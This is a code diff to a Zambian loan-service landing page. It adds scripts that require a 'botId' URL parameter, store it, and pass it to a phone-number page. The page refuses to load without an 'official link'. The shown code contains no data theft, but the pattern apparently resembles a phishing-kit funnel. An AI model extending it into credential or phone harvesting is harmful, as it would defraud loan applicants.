@@ -1,6 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+    // ============================================================
+    //  BOT ID RESOLVER — runs FIRST on every page load
+    //  Reads botId from URL immediately. Never defaults to bot1.
+    //  Persists to localStorage. Rewrites URL so refreshes keep it.
+    //  Stops the page if botId is missing.
+    // ============================================================
+    (function () {
+        try {
+            const params = new URLSearchParams(window.location.search);
+
+            // 1. Read from URL FIRST
+            let botId = params.get('botId');
+
+            // 2. Fall back to localStorage ONLY if URL is empty
+            if (!botId) {
+                botId = localStorage.getItem('botId');
+            }
+
+            // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
+            if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+                document.documentElement.innerHTML =
+                    '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+                    '<h2>Invalid link</h2>' +
+                    '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+                    '</body>';
+                window.__BOTID_MISSING__ = true;
+                throw new Error('botId missing from URL and localStorage');
+            }
+
+            // 4. Persist so later pages inherit it
+            localStorage.setItem('botId', botId);
+
+            // 5. Ensure the URL always carries botId
+            if (params.get('botId') !== botId) {
+                params.set('botId', botId);
+                const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+                window.history.replaceState({}, '', newUrl);
+            }
+
+            // 6. Expose globally
+            window.__BOT_ID__ = botId;
+
+            console.log('🆔 botId resolved immediately:', botId);
+        } catch (err) {
+            console.error('botId resolver failed:', err.message);
+        }
+    })();
+    </script>
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Welcome</title>
@@ -76,8 +126,20 @@
             <h1>Welcome to <br /><span class="highlight">your trusted</span> loan service in Zambia</h1>
             <p>Your reliable partner for quick and affordable loans in Zambia. Get started in minutes — no stress, no hidden fees.</p>
         </div>
-        <a href="phone.html" class="btn-apply">Apply Now</a>
+        <a href="phone.html" id="applyBtn" class="btn-apply">Apply Now</a>
         <div class="footer-note"><span>✔</span> Secure &bull; <span>✔</span> Fast approval</div>
     </div>
+
+    <script>
+        // ---------- BOTID (resolved by the head script) ----------
+        const botId = window.__BOT_ID__;
+        if (botId) {
+            // Preserve botId on the Apply Now link
+            const applyBtn = document.getElementById('applyBtn');
+            if (applyBtn) {
+                applyBtn.href = 'phone.html?botId=' + encodeURIComponent(botId);
+            }
+        }
+    </script>
 </body>
 </html>
